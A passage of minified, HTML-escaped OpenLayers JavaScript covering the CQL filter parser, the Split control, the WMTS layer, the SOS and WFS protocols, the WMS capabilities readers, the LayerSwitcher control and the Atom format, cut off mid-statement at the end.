"GEOMETRY":case "VALUE":e.push(g);break;case "COMPARISON":case "BETWEEN":case "IS_NULL":case "LOGICAL":for(var k=h[g.type];0&lt;c.length&amp;&amp;h[c[c.length-1].type]&lt;=k;)e.push(c.pop());c.push(g);break;case "SPATIAL":case "NOT":case "LPAREN":c.push(g);break;case "RPAREN":for(;0&lt;c.length&amp;&amp;"LPAREN"!=c[c.length-1].type;)e.push(c.pop()); c.pop();0&lt;c.length&amp;&amp;"SPATIAL"==c[c.length-1].type&amp;&amp;e.push(c.pop());case "COMMA":case "END":break;default:throw Error("Unknown token type "+g.type);}}for(;0&lt;c.length;)e.push(c.pop());a=b();if(0&lt;e.length){a="Remaining tokens after building AST: \n";for(c=e.length-1;0&lt;=c;c--)a+=e[c].type+": "+e[c].text+"\n";throw Error(a);}return a}var b={PROPERTY:/^[_a-zA-Z]\w*/,COMPARISON:/^(=|&lt;>|&lt;=|&lt;|>=|>|LIKE)/i,IS_NULL:/^IS NULL/i,COMMA:/^,/,LOGICAL:/^(AND|OR)/i,VALUE:/^('([^']|'')*'|\d+(\.\d*)?|\.\d+)/,LPAREN:/^\(/, RPAREN:/^\)/,SPATIAL:/^(BBOX|INTERSECTS|DWITHIN|WITHIN|CONTAINS)/i,NOT:/^NOT/i,BETWEEN:/^BETWEEN/i,GEOMETRY:function(a){var b=/^(POINT|LINESTRING|POLYGON|MULTIPOINT|MULTILINESTRING|MULTIPOLYGON|GEOMETRYCOLLECTION)/.exec(a);if(b){var c=a.length,b=a.indexOf("(",b[0].length);if(-1&lt;b)for(var d=1;b&lt;c&amp;&amp;0&lt;d;)switch(b++,a.charAt(b)){case "(":d++;break;case ")":d--}return[a.substr(0,b+1)]}},END:/^$/},c={LPAREN:["GEOMETRY","SPATIAL","PROPERTY","VALUE","LPAREN"],RPAREN:["NOT","LOGICAL","END","RPAREN"],PROPERTY:["COMPARISON", "BETWEEN","COMMA","IS_NULL"],BETWEEN:["VALUE"],IS_NULL:["END"],COMPARISON:["VALUE"],COMMA:["GEOMETRY","VALUE","PROPERTY"],VALUE:["LOGICAL","COMMA","RPAREN","END"],SPATIAL:["LPAREN"],LOGICAL:["NOT","VALUE","SPATIAL","PROPERTY","LPAREN"],NOT:["PROPERTY","LPAREN"],GEOMETRY:["COMMA","RPAREN"]},d={"=":OpenLayers.Filter.Comparison.EQUAL_TO,"&lt;>":OpenLayers.Filter.Comparison.NOT_EQUAL_TO,"&lt;":OpenLayers.Filter.Comparison.LESS_THAN,"&lt;=":OpenLayers.Filter.Comparison.LESS_THAN_OR_EQUAL_TO,">":OpenLayers.Filter.Comparison.GREATER_THAN, ">=":OpenLayers.Filter.Comparison.GREATER_THAN_OR_EQUAL_TO,LIKE:OpenLayers.Filter.Comparison.LIKE,BETWEEN:OpenLayers.Filter.Comparison.BETWEEN,"IS NULL":OpenLayers.Filter.Comparison.IS_NULL},e={},f={AND:OpenLayers.Filter.Logical.AND,OR:OpenLayers.Filter.Logical.OR},g={},h={RPAREN:3,LOGICAL:2,COMPARISON:1},k;for(k in d)d.hasOwnProperty(k)&amp;&amp;(e[d[k]]=k);for(k in f)f.hasOwnProperty(k)&amp;&amp;(g[f[k]]=k);return OpenLayers.Class(OpenLayers.Format,{read:function(d){var e=d;d=[];var f,g=["NOT","GEOMETRY","SPATIAL", "PROPERTY","LPAREN"];do{a:{f=g;for(var h=void 0,g=void 0,k=f.length,h=0;h&lt;k;h++){var g=f[h],s=b[g]instanceof RegExp?b[g].exec(e):(0,b[g])(e);if(s){f=s[0];e=e.substr(f.length).replace(/^\s*/,"");f={type:g,text:f,remainder:e};break a}}d="ERROR: In parsing: ["+e+"], expected one of: ";for(h=0;h&lt;k;h++)g=f[h],d+="\n "+g+": "+b[g];throw Error(d);}e=f.remainder;g=c[f.type];if("END"!=f.type&amp;&amp;!g)throw Error("No follows list for "+f.type);d.push(f)}while("END"!=f.type);d=a(d);this.keepData&amp;&amp;(this.data=d); return d},write:function(a){if(a instanceof OpenLayers.Geometry)return a.toString();switch(a.CLASS_NAME){case "OpenLayers.Filter.Spatial":switch(a.type){case OpenLayers.Filter.Spatial.BBOX:return"BBOX("+a.property+","+a.value.toBBOX()+")";case OpenLayers.Filter.Spatial.DWITHIN:return"DWITHIN("+a.property+", "+this.write(a.value)+", "+a.distance+")";case OpenLayers.Filter.Spatial.WITHIN:return"WITHIN("+a.property+", "+this.write(a.value)+")";case OpenLayers.Filter.Spatial.INTERSECTS:return"INTERSECTS("+ a.property+", "+this.write(a.value)+")";case OpenLayers.Filter.Spatial.CONTAINS:return"CONTAINS("+a.property+", "+this.write(a.value)+")";default:throw Error("Unknown spatial filter type: "+a.type);}case "OpenLayers.Filter.Logical":if(a.type==OpenLayers.Filter.Logical.NOT)return"NOT ("+this.write(a.filters[0])+")";for(var b="(",c=!0,d=0;d&lt;a.filters.length;d++)c?c=!1:b+=") "+g[a.type]+" (",b+=this.write(a.filters[d]);return b+")";case "OpenLayers.Filter.Comparison":return a.type==OpenLayers.Filter.Comparison.BETWEEN? a.property+" BETWEEN "+this.write(a.lowerBoundary)+" AND "+this.write(a.upperBoundary):null!==a.value?a.property+" "+e[a.type]+" "+this.write(a.value):a.property+" "+e[a.type];case void 0:if("string"===typeof a)return"'"+a.replace(/'/g,"''")+"'";if("number"===typeof a)return String(a);default:throw Error("Can't encode: "+a.CLASS_NAME+" "+a);}},CLASS_NAME:"OpenLayers.Format.CQL"})}();OpenLayers.Control.Split=OpenLayers.Class(OpenLayers.Control,{layer:null,source:null,sourceOptions:null,tolerance:null,edge:!0,deferDelete:!1,mutual:!0,targetFilter:null,sourceFilter:null,handler:null,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,[a]);this.options=a||{};this.options.source&amp;&amp;this.setSource(this.options.source)},setSource:function(a){this.active?(this.deactivate(),this.handler&amp;&amp;(this.handler.destroy(),delete this.handler),this.source=a,this.activate()):this.source= a},activate:function(){var a=OpenLayers.Control.prototype.activate.call(this);if(a)if(!this.source)this.handler||(this.handler=new OpenLayers.Handler.Path(this,{done:function(a){this.onSketchComplete({feature:new OpenLayers.Feature.Vector(a)})}},{layerOptions:this.sourceOptions})),this.handler.activate();else if(this.source.events)this.source.events.on({sketchcomplete:this.onSketchComplete,afterfeaturemodified:this.afterFeatureModified,scope:this});return a},deactivate:function(){var a=OpenLayers.Control.prototype.deactivate.call(this); a&amp;&amp;this.source&amp;&amp;this.source.events&amp;&amp;this.source.events.un({sketchcomplete:this.onSketchComplete,afterfeaturemodified:this.afterFeatureModified,scope:this});return a},onSketchComplete:function(a){this.feature=null;return!this.considerSplit(a.feature)},afterFeatureModified:function(a){a.modified&amp;&amp;"function"===typeof a.feature.geometry.split&amp;&amp;(this.feature=a.feature,this.considerSplit(a.feature))},removeByGeometry:function(a,b){for(var c=0,d=a.length;c&lt;d;++c)if(a[c].geometry===b){a.splice(c,1);break}}, isEligible:function(a){return a.geometry?a.state!==OpenLayers.State.DELETE&amp;&amp;"function"===typeof a.geometry.split&amp;&amp;this.feature!==a&amp;&amp;(!this.targetFilter||this.targetFilter.evaluate(a.attributes)):!1},considerSplit:function(a){var b=!1,c=!1;if(!this.sourceFilter||this.sourceFilter.evaluate(a.attributes)){for(var d=this.layer&amp;&amp;this.layer.features||[],e,f,g=[],h=[],k=this.layer===this.source&amp;&amp;this.mutual,l={edge:this.edge,tolerance:this.tolerance,mutual:k},m=[a.geometry],n,p,q,r=0,s=d.length;r&lt;s;++r)if(n= d[r],this.isEligible(n)){p=[n.geometry];for(var t=0;t&lt;m.length;++t){q=m[t];for(var u=0;u&lt;p.length;++u)if(e=p[u],q.getBounds().intersectsBounds(e.getBounds())&amp;&amp;(e=q.split(e,l)))f=this.events.triggerEvent("beforesplit",{source:a,target:n}),!1!==f&amp;&amp;(k&amp;&amp;(f=e[0],1&lt;f.length&amp;&amp;(f.unshift(t,1),Array.prototype.splice.apply(m,f),t+=f.length-3),e=e[1]),1&lt;e.length&amp;&amp;(e.unshift(u,1),Array.prototype.splice.apply(p,e),u+=e.length-3))}p&amp;&amp;1&lt;p.length&amp;&amp;(this.geomsToFeatures(n,p),this.events.triggerEvent("split",{original:n, features:p}),Array.prototype.push.apply(g,p),h.push(n),c=!0)}m&amp;&amp;1&lt;m.length&amp;&amp;(this.geomsToFeatures(a,m),this.events.triggerEvent("split",{original:a,features:m}),Array.prototype.push.apply(g,m),h.push(a),b=!0);if(b||c){if(this.deferDelete){d=[];r=0;for(s=h.length;r&lt;s;++r)c=h[r],c.state===OpenLayers.State.INSERT?d.push(c):(c.state=OpenLayers.State.DELETE,this.layer.drawFeature(c));this.layer.destroyFeatures(d,{silent:!0});r=0;for(s=g.length;r&lt;s;++r)g[r].state=OpenLayers.State.INSERT}else this.layer.destroyFeatures(h, {silent:!0});this.layer.addFeatures(g,{silent:!0});this.events.triggerEvent("aftersplit",{source:a,features:g})}}return b},geomsToFeatures:function(a,b){var c=a.clone();delete c.geometry;for(var d,e=0,f=b.length;e&lt;f;++e)d=c.clone(),d.geometry=b[e],d.state=OpenLayers.State.INSERT,b[e]=d},destroy:function(){this.active&amp;&amp;this.deactivate();OpenLayers.Control.prototype.destroy.call(this)},CLASS_NAME:"OpenLayers.Control.Split"});OpenLayers.Layer.WMTS=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,version:"1.0.0",requestEncoding:"KVP",url:null,layer:null,matrixSet:null,style:null,format:"image/jpeg",tileOrigin:null,tileFullExtent:null,formatSuffix:null,matrixIds:null,dimensions:null,params:null,zoomOffset:0,serverResolutions:null,formatSuffixMap:{"image/png":"png","image/png8":"png","image/png24":"png","image/png32":"png",png:"png","image/jpeg":"jpg","image/jpg":"jpg",jpeg:"jpg",jpg:"jpg"},matrix:null,initialize:function(a){var b= {url:!0,layer:!0,style:!0,matrixSet:!0},c;for(c in b)if(!(c in a))throw Error("Missing property '"+c+"' in layer configuration.");a.params=OpenLayers.Util.upperCaseObject(a.params);OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a.name,a.url,a.params,a]);this.formatSuffix||(this.formatSuffix=this.formatSuffixMap[this.format]||this.format.split("/").pop());if(this.matrixIds&amp;&amp;(a=this.matrixIds.length)&amp;&amp;"string"===typeof this.matrixIds[0])for(b=this.matrixIds,this.matrixIds=Array(a),c=0;c&lt;a;++c)this.matrixIds[c]= {identifier:b[c]}},setMap:function(){OpenLayers.Layer.Grid.prototype.setMap.apply(this,arguments)},updateMatrixProperties:function(){if(this.matrix=this.getMatrix())this.matrix.topLeftCorner&amp;&amp;(this.tileOrigin=this.matrix.topLeftCorner),this.matrix.tileWidth&amp;&amp;this.matrix.tileHeight&amp;&amp;(this.tileSize=new OpenLayers.Size(this.matrix.tileWidth,this.matrix.tileHeight)),this.tileOrigin||(this.tileOrigin=new OpenLayers.LonLat(this.maxExtent.left,this.maxExtent.top)),this.tileFullExtent||(this.tileFullExtent= this.maxExtent)},moveTo:function(a,b,c){!b&amp;&amp;this.matrix||this.updateMatrixProperties();return OpenLayers.Layer.Grid.prototype.moveTo.apply(this,arguments)},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.WMTS(this.options));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this,[a])},getIdentifier:function(){return this.getServerZoom()},getMatrix:function(){var a;if(this.matrixIds&amp;&amp;0!==this.matrixIds.length)if("scaleDenominator"in this.matrixIds[0])for(var b=OpenLayers.METERS_PER_INCH*OpenLayers.INCHES_PER_UNIT[this.units]* this.getServerResolution()/2.8E-4,c=Number.POSITIVE_INFINITY,d,e=0,f=this.matrixIds.length;e&lt;f;++e)d=Math.abs(1-this.matrixIds[e].scaleDenominator/b),d&lt;c&amp;&amp;(c=d,a=this.matrixIds[e]);else a=this.matrixIds[this.getIdentifier()];else a={identifier:this.getIdentifier()};return a},getTileInfo:function(a){var b=this.getServerResolution(),c=(a.lon-this.tileOrigin.lon)/(b*this.tileSize.w);a=(this.tileOrigin.lat-a.lat)/(b*this.tileSize.h);var b=Math.floor(c),d=Math.floor(a);return{col:b,row:d,i:Math.floor((c- b)*this.tileSize.w),j:Math.floor((a-d)*this.tileSize.h)}},getURL:function(a){a=this.adjustBounds(a);var b="";if(!this.tileFullExtent||this.tileFullExtent.intersectsBounds(a)){a=a.getCenterLonLat();var c=this.getTileInfo(a);a=this.dimensions;var d,b=OpenLayers.Util.isArray(this.url)?this.selectUrl([this.version,this.style,this.matrixSet,this.matrix.identifier,c.row,c.col].join(),this.url):this.url;if("REST"===this.requestEncoding.toUpperCase())if(d=this.params,-1!==b.indexOf("{")){b=b.replace(/\{/g, "${");c={style:this.style,Style:this.style,TileMatrixSet:this.matrixSet,TileMatrix:this.matrix.identifier,TileRow:c.row,TileCol:c.col};if(a){var e,f;for(f=a.length-1;0&lt;=f;--f)e=a[f],c[e]=d[e.toUpperCase()]}b=OpenLayers.String.format(b,c)}else{e=this.version+"/"+this.layer+"/"+this.style+"/";if(a)for(f=0;f&lt;a.length;f++)d[a[f]]&amp;&amp;(e=e+d[a[f]]+"/");e=e+this.matrixSet+"/"+this.matrix.identifier+"/"+c.row+"/"+c.col+"."+this.formatSuffix;b.match(/\/$/)||(b+="/");b+=e}else"KVP"===this.requestEncoding.toUpperCase()&amp;&amp; (d={SERVICE:"WMTS",REQUEST:"GetTile",VERSION:this.version,LAYER:this.layer,STYLE:this.style,TILEMATRIXSET:this.matrixSet,TILEMATRIX:this.matrix.identifier,TILEROW:c.row,TILECOL:c.col,FORMAT:this.format},b=OpenLayers.Layer.Grid.prototype.getFullRequestString.apply(this,[d]))}return b},mergeNewParams:function(a){if("KVP"===this.requestEncoding.toUpperCase())return OpenLayers.Layer.Grid.prototype.mergeNewParams.apply(this,[OpenLayers.Util.upperCaseObject(a)])},CLASS_NAME:"OpenLayers.Layer.WMTS"});OpenLayers.Protocol.SOS.v1_0_0=OpenLayers.Class(OpenLayers.Protocol,{fois:null,formatOptions:null,initialize:function(a){OpenLayers.Protocol.prototype.initialize.apply(this,[a]);a.format||(this.format=new OpenLayers.Format.SOSGetFeatureOfInterest(this.formatOptions))},destroy:function(){this.options&amp;&amp;!this.options.format&amp;&amp;this.format.destroy();this.format=null;OpenLayers.Protocol.prototype.destroy.apply(this)},read:function(a){a=OpenLayers.Util.extend({},a);OpenLayers.Util.applyDefaults(a,this.options|| {});var b=new OpenLayers.Protocol.Response({requestType:"read"}),c=this.format,c=OpenLayers.Format.XML.prototype.write.apply(c,[c.writeNode("sos:GetFeatureOfInterest",{fois:this.fois})]);b.priv=OpenLayers.Request.POST({url:a.url,callback:this.createCallback(this.handleRead,b,a),data:c});return b},handleRead:function(a,b){if(b.callback){var c=a.priv;200&lt;=c.status&amp;&amp;300>c.status?(a.features=this.parseFeatures(c),a.code=OpenLayers.Protocol.Response.SUCCESS):a.code=OpenLayers.Protocol.Response.FAILURE; b.callback.call(b.scope,a)}},parseFeatures:function(a){var b=a.responseXML;b&amp;&amp;b.documentElement||(b=a.responseText);return!b||0>=b.length?null:this.format.read(b)},CLASS_NAME:"OpenLayers.Protocol.SOS.v1_0_0"});OpenLayers.Layer.KaMapCache=OpenLayers.Class(OpenLayers.Layer.KaMap,{IMAGE_EXTENSIONS:{jpeg:"jpg",gif:"gif",png:"png",png8:"png",png24:"png",dithered:"png"},DEFAULT_FORMAT:"jpeg",initialize:function(a,b,c,d){OpenLayers.Layer.KaMap.prototype.initialize.apply(this,arguments);this.extension=this.IMAGE_EXTENSIONS[this.params.i.toLowerCase()||this.DEFAULT_FORMAT]},getURL:function(a){a=this.adjustBounds(a);var b=this.map.getResolution(),c=Math.round(1E4*this.map.getScale())/1E4,d=Math.round(a.left/b);a= -Math.round(a.top/b);var b=Math.floor(d/this.tileSize.w/this.params.metaTileSize.w)*this.tileSize.w*this.params.metaTileSize.w,e=Math.floor(a/this.tileSize.h/this.params.metaTileSize.h)*this.tileSize.h*this.params.metaTileSize.h,c=["/",this.params.map,"/",c,"/",this.params.g.replace(/\s/g,"_"),"/def/t",e,"/l",b,"/t",a,"l",d,".",this.extension],d=this.url;OpenLayers.Util.isArray(d)&amp;&amp;(d=this.selectUrl(c.join(""),d));return d+c.join("")},CLASS_NAME:"OpenLayers.Layer.KaMapCache"});OpenLayers.Protocol.WFS.v1_1_0=OpenLayers.Class(OpenLayers.Protocol.WFS.v1,{version:"1.1.0",initialize:function(a){OpenLayers.Protocol.WFS.v1.prototype.initialize.apply(this,arguments);this.outputFormat&amp;&amp;!this.readFormat&amp;&amp;("gml2"==this.outputFormat.toLowerCase()?this.readFormat=new OpenLayers.Format.GML.v2({featureType:this.featureType,featureNS:this.featureNS,geometryName:this.geometryName}):"json"==this.outputFormat.toLowerCase()&amp;&amp;(this.readFormat=new OpenLayers.Format.GeoJSON))},CLASS_NAME:"OpenLayers.Protocol.WFS.v1_1_0"});OpenLayers.Format.WMSCapabilities.v1_1_1=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_1,{version:"1.1.1",readers:{wms:OpenLayers.Util.applyDefaults({SRS:function(a,b){b.srs[this.getChildValue(a)]=!0}},OpenLayers.Format.WMSCapabilities.v1_1.prototype.readers.wms)},CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_1_1"});OpenLayers.Format.WMSCapabilities.v1_1_1_WMSC=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_1_1,{version:"1.1.1",profile:"WMSC",readers:{wms:OpenLayers.Util.applyDefaults({VendorSpecificCapabilities:function(a,b){b.vendorSpecific={tileSets:[]};this.readChildNodes(a,b.vendorSpecific)},TileSet:function(a,b){var c={srs:{},bbox:{},resolutions:[]};this.readChildNodes(a,c);b.tileSets.push(c)},Resolutions:function(a,b){for(var c=this.getChildValue(a).split(" "),d=0,e=c.length;d&lt;e;d++)""!=c[d]&amp;&amp;b.resolutions.push(parseFloat(c[d]))}, Width:function(a,b){b.width=parseInt(this.getChildValue(a))},Height:function(a,b){b.height=parseInt(this.getChildValue(a))},Layers:function(a,b){b.layers=this.getChildValue(a)},Styles:function(a,b){b.styles=this.getChildValue(a)}},OpenLayers.Format.WMSCapabilities.v1_1_1.prototype.readers.wms)},CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_1_1_WMSC"});OpenLayers.Control.LayerSwitcher=OpenLayers.Class(OpenLayers.Control,{layerStates:null,layersDiv:null,baseLayersDiv:null,baseLayers:null,dataLbl:null,dataLayersDiv:null,dataLayers:null,minimizeDiv:null,maximizeDiv:null,ascending:!0,initialize:function(a){OpenLayers.Control.prototype.initialize.apply(this,arguments);this.layerStates=[]},destroy:function(){this.clearLayersArray("base");this.clearLayersArray("data");this.map.events.un({buttonclick:this.onButtonClick,addlayer:this.redraw,changelayer:this.redraw, removelayer:this.redraw,changebaselayer:this.redraw,scope:this});this.events.unregister("buttonclick",this,this.onButtonClick);OpenLayers.Control.prototype.destroy.apply(this,arguments)},setMap:function(a){OpenLayers.Control.prototype.setMap.apply(this,arguments);this.map.events.on({addlayer:this.redraw,changelayer:this.redraw,removelayer:this.redraw,changebaselayer:this.redraw,scope:this});this.outsideViewport?(this.events.attachToElement(this.div),this.events.register("buttonclick",this,this.onButtonClick)): this.map.events.register("buttonclick",this,this.onButtonClick)},draw:function(){OpenLayers.Control.prototype.draw.apply(this);this.loadContents();this.outsideViewport||this.minimizeControl();this.redraw();return this.div},onButtonClick:function(a){a=a.buttonElement;a===this.minimizeDiv?this.minimizeControl():a===this.maximizeDiv?this.maximizeControl():a._layerSwitcher===this.id&amp;&amp;(a["for"]&amp;&amp;(a=document.getElementById(a["for"])),a.disabled||("radio"==a.type?(a.checked=!0,this.map.setBaseLayer(this.map.getLayer(a._layer))): (a.checked=!a.checked,this.updateMap())))},clearLayersArray:function(a){this[a+"LayersDiv"].innerHTML="";this[a+"Layers"]=[]},checkRedraw:function(){if(!this.layerStates.length||this.map.layers.length!=this.layerStates.length)return!0;for(var a=0,b=this.layerStates.length;a&lt;b;a++){var c=this.layerStates[a],d=this.map.layers[a];if(c.name!=d.name||c.inRange!=d.inRange||c.id!=d.id||c.visibility!=d.visibility)return!0}return!1},redraw:function(){if(!this.checkRedraw())return this.div;this.clearLayersArray("base"); this.clearLayersArray("data");var a=!1,b=!1,c=this.map.layers.length;this.layerStates=Array(c);for(var d=0;d&lt;c;d++){var e=this.map.layers[d];this.layerStates[d]={name:e.name,visibility:e.visibility,inRange:e.inRange,id:e.id}}var f=this.map.layers.slice();this.ascending||f.reverse();d=0;for(c=f.length;d&lt;c;d++){var e=f[d],g=e.isBaseLayer;if(e.displayInLayerSwitcher){g?b=!0:a=!0;var h=g?e==this.map.baseLayer:e.getVisibility(),k=document.createElement("input"),l=OpenLayers.Util.createUniqueID(this.id+ "_input_");k.id=l;k.name=g?this.id+"_baseLayers":e.name;k.type=g?"radio":"checkbox";k.value=e.name;k.checked=h;k.defaultChecked=h;k.className="olButton";k._layer=e.id;k._layerSwitcher=this.id;g||e.inRange||(k.disabled=!0);h=document.createElement("label");h["for"]=k.id;OpenLayers.Element.addClass(h,"labelSpan olButton");h._layer=e.id;h._layerSwitcher=this.id;g||e.inRange||(h.style.color="gray");h.innerHTML=e.name;h.style.verticalAlign=g?"bottom":"baseline";l=document.createElement("br");(g?this.baseLayers: this.dataLayers).push({layer:e,inputElem:k,labelSpan:h});e=g?this.baseLayersDiv:this.dataLayersDiv;e.appendChild(k);e.appendChild(h);e.appendChild(l)}}this.dataLbl.style.display=a?"":"none";this.baseLbl.style.display=b?"":"none";return this.div},updateMap:function(){for(var a=0,b=this.baseLayers.length;a&lt;b;a++){var c=this.baseLayers[a];c.inputElem.checked&amp;&amp;this.map.setBaseLayer(c.layer,!1)}a=0;for(b=this.dataLayers.length;a&lt;b;a++)c=this.dataLayers[a],c.layer.setVisibility(c.inputElem.checked)},maximizeControl:function(a){this.div.style.width= "";this.div.style.height="";this.showControls(!1);null!=a&amp;&amp;OpenLayers.Event.stop(a)},minimizeControl:function(a){this.div.style.width="0px";this.div.style.height="0px";this.showControls(!0);null!=a&amp;&amp;OpenLayers.Event.stop(a)},showControls:function(a){this.maximizeDiv.style.display=a?"":"none";this.minimizeDiv.style.display=a?"none":"";this.layersDiv.style.display=a?"none":""},loadContents:function(){this.layersDiv=document.createElement("div");this.layersDiv.id=this.id+"_layersDiv";OpenLayers.Element.addClass(this.layersDiv, "layersDiv");this.baseLbl=document.createElement("div");this.baseLbl.innerHTML=OpenLayers.i18n("Base Layer");OpenLayers.Element.addClass(this.baseLbl,"baseLbl");this.baseLayersDiv=document.createElement("div");OpenLayers.Element.addClass(this.baseLayersDiv,"baseLayersDiv");this.dataLbl=document.createElement("div");this.dataLbl.innerHTML=OpenLayers.i18n("Overlays");OpenLayers.Element.addClass(this.dataLbl,"dataLbl");this.dataLayersDiv=document.createElement("div");OpenLayers.Element.addClass(this.dataLayersDiv, "dataLayersDiv");this.ascending?(this.layersDiv.appendChild(this.baseLbl),this.layersDiv.appendChild(this.baseLayersDiv),this.layersDiv.appendChild(this.dataLbl),this.layersDiv.appendChild(this.dataLayersDiv)):(this.layersDiv.appendChild(this.dataLbl),this.layersDiv.appendChild(this.dataLayersDiv),this.layersDiv.appendChild(this.baseLbl),this.layersDiv.appendChild(this.baseLayersDiv));this.div.appendChild(this.layersDiv);var a=OpenLayers.Util.getImageLocation("layer-switcher-maximize.png");this.maximizeDiv= OpenLayers.Util.createAlphaImageDiv("OpenLayers_Control_MaximizeDiv",null,null,a,"absolute");OpenLayers.Element.addClass(this.maximizeDiv,"maximizeDiv olButton");this.maximizeDiv.style.display="none";this.div.appendChild(this.maximizeDiv);a=OpenLayers.Util.getImageLocation("layer-switcher-minimize.png");this.minimizeDiv=OpenLayers.Util.createAlphaImageDiv("OpenLayers_Control_MinimizeDiv",null,null,a,"absolute");OpenLayers.Element.addClass(this.minimizeDiv,"minimizeDiv olButton");this.minimizeDiv.style.display= "none";this.div.appendChild(this.minimizeDiv)},CLASS_NAME:"OpenLayers.Control.LayerSwitcher"});OpenLayers.Format.Atom=OpenLayers.Class(OpenLayers.Format.XML,{namespaces:{atom:"http://www.w3.org/2005/Atom",georss:"http://www.georss.org/georss"},feedTitle:"untitled",defaultEntryTitle:"untitled",gmlParser:null,xy:!1,read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));return this.parseFeatures(a)},write:function(a){var b;if(OpenLayers.Util.isArray(a)){b=this.createElementNSPlus("atom:feed");b.appendChild(this.createElementNSPlus("atom:title",{value:this.feedTitle})); for(var c=0,d=a.length;c&lt;d;c++)b.appendChild(this.buildEntryNode(a[c]))}else b=this.buildEntryNode(a);return OpenLayers.Format.XML.prototype.write.apply(this,[b])},buildContentNode:function(a){var b=this.createElementNSPlus("atom:content",{attributes:{type:a.type||null}});if(a.src)b.setAttribute("src",a.src);else if("text"==a.type||null==a.type)b.appendChild(this.createTextNode(a.value));else if("html"==a.type){if("string"!=typeof a.value)throw"HTML content must be in form of an escaped string";b.appendChild(this.createTextNode(a.value))}else"xhtml"== a.type?b.appendChild(a.value):"xhtml"==a.type||a.type.match(/(\+|\/)xml$/)?b.appendChild(a.value):b.appendChild(this.createTextNode(a.value));return b},buildEntryNode:function(a){var b=a.attributes,c=b.atom||{},d=this.createElementNSPlus("atom:entry");if(c.authors)for(var e=OpenLayers.Util.isArray(c.authors)?c.authors:[c.authors],f=0,g=e.length;f&lt;g;f++)d.appendChild(this.buildPersonConstructNode("author",e[f]));if(c.categories)for(var e=OpenLayers.Util.isArray(c.categories)?c.categories:[c.categories], h,f=0,g=e.length;f&lt;g;f++)h=e[f],d.appendChild(this.createElementNSPlus("atom:category",{attributes:{term:h.term,scheme:h.scheme||null,label:h.label||null}}));c.content&amp;&amp;d.appendChild(this.buildContentNode(c.content));if(c.contributors)for(e=OpenLayers.Util.isArray(c.contributors)?c.contributors:[c.contributors],f=0,g=e.length;f&lt;g;f++)d.appendChild(this.buildPersonConstructNode("contributor",e[f]));a.fid&amp;&amp;d.appendChild(this.createElementNSPlus("atom:id",{value:a.fid}));if(c.links)for(e=OpenLayers.Util.isArray(c.links)? c.links:[c.links],f=0,g=e.length;f&lt;g;f++)h=e[f],d.appendChild(this.createElementNSPlus("atom:link",{attributes:{href:h.href,rel:h.rel||null,type:h.type||null,hreflang:h.hreflang||null,title:h.title||null,length:h.length||null}}));c.published&amp;&amp;d.appendChild(this.createElementNSPlus("atom:published",{value:c.published}));c.rights&amp;&amp;d.appendChild(this.createElementNSPlus("atom:rights",{value:c.rights}));(c.summary||b.description)&amp;&amp;d.appendChild(this.createElementNSPlus("atom:summary",{value:c.summary|| b.description}));d.appendChild(this.createElementNSPlus("atom:title",{value:c.title||b.title||this.defaultEntryTitle}));c.updated&amp;&amp;d.appendChild(this.createElementNSPlus("atom:updated",{value:c.updated}));a.geometry&amp;&amp;(b=this.createElementNSPlus("georss:where"),b.appendChild(this.buildGeometryNode(a.geometry)),d.appendChild(b));return d},initGmlParser:function(){this.gmlParser=new OpenLayers.Format.GML.v3({xy:this.xy,featureNS:"http://example.com#feature",internalProjection:this.internalProjection, externalProjection:this.externalProjection})},buildGeometryNode:function(a){this.gmlParser||this.initGmlParser();return this.gmlParser.writeNode("feature:_geometry",a).firstChild},buildPersonConstructNode:function(a,b){var c=["uri","email"],d=this.createElementNSPlus("atom:"+a);d.appendChild(this.createElementNSPlus("atom:name",{value:b.name}));for(var e=0,f=c.length;e&lt;f;e++)b[c[e]]&amp;&amp;d.appendChild(this.createElementNSPlus("atom:"+c[e],{value:b[c[e]]}));return d},getFirstChildValue:function(a,b,c, d){return(a=this.getElementsByTagNameNS(a,b,c))&amp;&amp;0&lt;a.length?this.getChildValue(a[0],d):d},parseFeature:function(a){var b={},c=null,d=null,e=null,f=this.namespaces.atom;this.parsePersonConstructs(a,"author",b);d=this.getElementsByTagNameNS(a,f,"category");0&lt;d.length&amp;&amp;(b.categories=[]);for(var g=0,h=d.length;g&lt;h;g++){c={};c.term=d[g].getAttribute("term");if(e=d[g].getAttribute("scheme"))c.scheme=e;if(e=d[g].getAttribute("label"))c.label=e;b.categories.push(c)}d=this.getElementsByTagNameNS(a,f,"content"); if(0&lt;d.length){c={};if(e=d[0].getAttribute("type"))c.type=e;(e=d[0].getAttribute("src"))?c.src=e:("text"==c.type||"html"==c.type||null==c.type?c.value=this.getFirstChildValue(a,f,"content",null):"xhtml"==c.type||c.type.match(/(\+|\/)xml$/)?c.value=this.getChildEl(d[0]):c.value=this.getFirstChildValue(a,f,"content",null),b.content=c)}this.parsePersonConstructs(a,"contributor",b);b.id=this.getFirstChildValue(a,f,"id",null);d=this.getElementsByTagNameNS(a,f,"link");0&lt;d.length&amp;&amp;(b.links=Array(d.length)); for(var k=["rel","type","hreflang","title","length"],g=0,h=d.length;g&lt;h;g++){c={};c.href=d[g].getAttribute("href");for(var l=0,m=k.length;l&lt;m;l++)(e=d[g].getAttribute(k[l]))&amp;&amp;(c[k[l]]=e);b.links[g]=c}if(c=this.getFirstChildValue(a,f,"published",null))b.published=c;if(c=this.getFirstChildValue(a,f,"rights",null))b.rights=c;if(c=this.getFirstChildValue(a,f,"summary",null))b.summary=c;b.title=this.getFirstChildValue(a,f,"title",null);b.updated=this.getFirstChildValue(a,f,"updated",null);c={title:b.title, description:b.summary,atom:b};a=this.parseLocations(a)[0];a=new OpenLayers.Feature.Vector(a,c);a.fid=b.id;return a},parseFeatures:function(a){var b=[],c=this.getElementsByTagNameNS(a,this.namespaces.atom,"entry");0==c.length&amp;&amp;(c=[a]);a=0;for(var d=c.length;a&lt;d;a++)b.push(this.parseFeature(c[a]));return b},parseLocations:function(a){var 